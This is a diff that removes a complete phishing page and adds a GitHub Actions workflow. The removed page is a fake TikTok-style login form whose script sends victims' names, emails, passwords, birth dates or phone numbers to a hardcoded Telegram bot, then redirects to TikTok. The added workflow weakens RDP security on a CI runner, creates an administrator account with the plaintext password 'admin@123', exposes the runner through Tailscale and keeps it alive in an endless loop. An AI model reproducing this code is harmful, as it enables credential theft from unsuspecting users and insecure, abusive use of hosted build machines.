@@ -1,202 +1,82 @@
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #fff;
-      margin: 0;
-      padding: 0;
-    }
+name: RDP
+on:
+  workflow_dispatch:
+jobs:
+  secure-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 3600
+    steps:
+      - name: Configure Core RDP Settings
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+          netsh advfirewall firewall delete rule name="RDP-Tailscale"
+          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
+          Restart-Service -Name TermService -Force
 
-    .container {
-      max-width: 360px;
-      margin: 0 auto;
-      padding: 20px 16px;
-    }
+      - name: Create RDP User with Static Password
+        run: |
+          $password = "admin@123"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
 
-    .title {
-      text-align: center;
-      font-size: 22px;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
+          if (-not (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue)) {
+              New-LocalUser -Name "TOOLBOXLAP" -Password $securePass -AccountNeverExpires
+          }
 
-    .tabs {
-      display: flex;
-      justify-content: space-between;
-      border-bottom: 1px solid #ccc;
-      margin-bottom: 20px;
-    }
+          Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
 
-    .tab {
-      flex: 1;
-      text-align: center;
-      padding: 10px 0;
-      font-size: 15px;
-      color: #999;
-      cursor: pointer;
-    }
+          echo "RDP_CREDS=User: TOOLBOXLAP | Password: $password" >> $env:GITHUB_ENV
 
-    .tab.active {
-      border-bottom: 2px solid black;
-      color: black;
-      font-weight: bold;
-    }
+          if (-not (Get-LocalUser -Name "TOOLBOXLAP")) {
+              Write-Error "User creation failed"
+              exit 1
+          }
 
-    input {
-      width: 100%;
-      padding: 14px 12px;
-      margin-bottom: 16px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      background-color: #fafafa;
-      font-size: 15px;
-      box-sizing: border-box;
-    }
+      - name: Install Tailscale
+        run: |
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $installerPath = "$env:TEMP\tailscale.msi"
 
-    input:focus {
-      background-color: #fff;
-      border-color: #999;
-      outline: none;
-    }
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
 
-    .forgot {
-      text-align: right;
-      font-size: 14px;
-      color: #000;
-      margin-bottom: 20px;
-      cursor: pointer;
-    }
+      - name: Establish Tailscale Connection
+        run: |
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 10) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              $retries++
+          }
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
 
-    .login-btn {
-      width: 100%;
-      padding: 14px;
-      background-color: #eee;
-      border: none;
-      color: #aaa;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 12px;
-      cursor: not-allowed;
-      transition: 0.3s;
-    }
+      - name: Verify RDP Accessibility
+        run: |
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error "TCP connection to RDP port 3389 failed"
+              exit 1
+          }
+          Write-Host "TCP connectivity successful!"
 
-    .login-btn.active {
-      background-color: #ff3b5c;
-      color: white;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-
-  <div class="container">
-    <div class="title">Login</div>
-
-    <div class="tabs">
-      <div class="tab" onclick="switchTab('phone')">Phone</div>
-      <div class="tab active" onclick="switchTab('email')">Email / Username</div>
-    </div>
-
-    <div id="form-email" class="form-content" style="display: block;">
-      <input id="fullname" type="text" placeholder="Full Name" oninput="checkFields()" />
-      <input id="email" type="text" placeholder="Email or Username" oninput="checkFields()" />
-      <input id="password" type="password" placeholder="Password" oninput="checkFields()" />
-      <input id="dob" type="date" oninput="checkFields()" />
-    </div>
-
-    <div id="form-phone" class="form-content" style="display:none;">
-      <input id="phone-number" type="text" placeholder="Phone Number" oninput="checkFields()" />
-      <input id="phone-password" type="password" placeholder="Password" oninput="checkFields()" />
-    </div>
-
-    <div class="forgot">Forgot password?</div>
-    <button id="loginBtn" class="login-btn" disabled onclick="handleLogin()">Log In</button>
-  </div>
-
-  <script>
-    function switchTab(type) {
-      const tabs = document.querySelectorAll('.tab');
-      const forms = document.querySelectorAll('.form-content');
-      tabs.forEach(tab => tab.classList.remove('active'));
-      forms.forEach(form => form.style.display = 'none');
-
-      if (type === 'phone') {
-        tabs[0].classList.add('active');
-        document.getElementById('form-phone').style.display = 'block';
-      } else {
-        tabs[1].classList.add('active');
-        document.getElementById('form-email').style.display = 'block';
-      }
-
-      checkFields();
-    }
-
-    function checkFields() {
-      const emailForm = document.getElementById('form-email');
-      const phoneForm = document.getElementById('form-phone');
-      const btn = document.getElementById('loginBtn');
-
-      let allFilled = false;
-
-      if (emailForm.style.display === 'block') {
-        const inputs = emailForm.querySelectorAll('input');
-        allFilled = [...inputs].every(input => input.value.trim() !== '');
-      } else {
-        const inputs = phoneForm.querySelectorAll('input');
-        allFilled = [...inputs].every(input => input.value.trim() !== '');
-      }
-
-      if (allFilled) {
-        btn.classList.add('active');
-        btn.disabled = false;
-      } else {
-        btn.classList.remove('active');
-        btn.disabled = true;
-      }
-    }
-
-    function handleLogin() {
-      const isEmailTab = document.getElementById('form-email').style.display === 'block';
-      let message = "🎉 جبتلك حساب جديد!\n";
-      message += "ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n";
-
-      if (isEmailTab) {
-        const fullname = document.getElementById('fullname').value.trim();
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const dob = document.getElementById('dob').value;
-
-        message += `👤 الاسم الكامل: ${fullname}\n`;
-        message += `📧 البريد الإلكتروني: ${email}\n`;
-        message += `🔑 كلمة المرور: ${password}\n`;
-        message += `📅 تاريخ الميلاد: ${dob}\n`;
-      } else {
-        const phone = document.getElementById('phone-number').value.trim();
-        const password = document.getElementById('phone-password').value.trim();
-
-        message += `📱 رقم الهاتف: ${phone}\n`;
-        message += `🔑 كلمة المرور: ${password}\n`;
-      }
-
-      message += "ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ";
-
-      const botToken = "7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0";
-      const chatId = "5029891039";
-      const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-      fetch(telegramURL)
-        .then(() => {
-          window.location.href = "https://www.tiktok.com/login";
-        })
-        .catch(() => {
-          alert("Failed to send to bot.");
-        });
-    }
-  </script>
-</body>
-</html>
+      - name: Maintain Connection
+        run: |
+          Write-Host "`n=== RDP ACCESS ==="
+          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "Username: TOOLBOXLAP"
+          Write-Host "Password: admin@123"
+          Write-Host "==================`n"
+          while ($true) {
+              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
+              Start-Sleep -Seconds 300
+          }
